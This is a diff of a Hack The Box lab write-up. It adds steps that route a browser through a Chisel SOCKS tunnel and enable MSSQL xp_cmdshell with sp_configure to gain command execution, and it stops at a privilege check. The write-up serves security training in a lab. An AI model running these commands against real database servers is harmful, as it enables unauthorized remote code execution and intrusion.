@@ -496,8 +496,22 @@ TheControlDevil@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
 2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
 2022/05/05 14:21:19 client: tun: SSH connected
 ```
-We also make sure that we have socks5 127.0.0.1 1080 in our /etc/proxychains.conf file since 1080 is the default proxychains port that will connect to the Chisel tunnel. After this, we do proxychains firefox 172.16.8.20 again and see that we have no lag connecting to the website and entering in our credentials after upgrading our pure SSH tunnel to a Chisel tunnel. 
+We also make sure that we have socks5 127.0.0.1 1080 in our /etc/proxychains.conf file since 1080 is the default port for Chisel and SOCKS non-tor proxies. We also have to set up a manual proxy in network settings in our firefox browser, listing our loopback address and the 1080 port. After this, we do proxychains firefox 172.16.8.20 again and see that we have no lag connecting to the website and entering in our credentials after upgrading our pure SSH tunnel to a Chisel tunnel. 
 
 First thing that was interesting to me was the SQL console. We try to inject the following commands to get a xp_commandshell:
 ```
-
+EXEC sp_configure 'show advanced options', '1'
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', '1' 
+RECONFIGURE
+```
+Then we run
+```
+xp_cmdshell 'whoami'
+```
+and successfully get RCE:
+```
+nt service\mssql$sqlexpress
+```
+We now run a privilege check with whoami /priv and get:
+```
